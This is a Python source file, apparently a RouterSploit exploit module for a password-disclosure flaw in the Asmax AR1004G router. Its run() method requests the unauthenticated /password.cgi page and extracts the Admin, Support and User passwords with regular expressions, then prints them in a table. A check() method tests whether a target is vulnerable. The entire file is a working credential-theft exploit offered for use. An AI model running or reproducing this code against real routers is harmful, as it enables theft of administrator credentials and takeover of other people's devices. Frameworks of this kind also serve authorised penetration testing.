import requests
import re

from routersploit import *


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Asmax AR1004G Password Disclosure vulnerability.
    If the target is vulnerable it allows to read credentials for admin, support and user."
    """
    __info__ = {
        'name': 'Asmax AR1004G Password Disclosure',
        'description': 'Exploits asmax password disclosure vulnerability that allows to fetch credentials for: Admin, Support and User accounts.',
        'authors': [
            'Marcin Bury <marcin.bury@reverse-shell.com>', # routersploit module
         ],
        'references': [
             'https://github.com/lucyoa/exploits/blob/master/asmax/asmax.txt'
         ],
         'targets': [
             'Asmax AR 1004g'
         ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1') # target address
    port = exploits.Option(80, 'Target port') # default port

    def run(self):
        url = sanitize_url("{}:{}/password.cgi".format(self.target, self.port))

        print_status("Requesting for {}".format(url))
        try:
            r = requests.get(url)
            res = r.text
        except (requests.exceptions.MissingSchema, requests.exceptions.InvalidSchema):
            print_error("Invalid URL format: %s" % url)
            return
        except requests.exceptions.ConnectionError:
            print_error("Connection error: %s" % url)
            return

        creds = []
        admin = re.findall("pwdAdmin = '(.+?)'", res)
        if len(admin):
            creds.append(('Admin', admin[0]))

        support = re.findall("pwdSupport = '(.+?)'", res)
        if len(support):
            creds.append(('Support', support[0]))

        user = re.findall("pwdUser = '(.+?)'", res)
        if len(user):
            creds.append(('User', user[0]))

        if len(creds):
            print_success("Credentials found!")
            headers = ("Login", "Password")
            print_table(headers, *creds)
        else:
            print_error("Credentials could not be found")


    def check(self):
        url = sanitize_url("{}:{}/password.cgi".format(self.target, self.port))

        try:
            r = requests.get(url)
            res = r.text
        except:
            return None # could not be verified

        if any(map(lambda x: x in res, ["pwdSupport", "pwdUser", "pwdAdmin"])):
            return True   # target vulnerable
        
        return False  # target not vulnerable

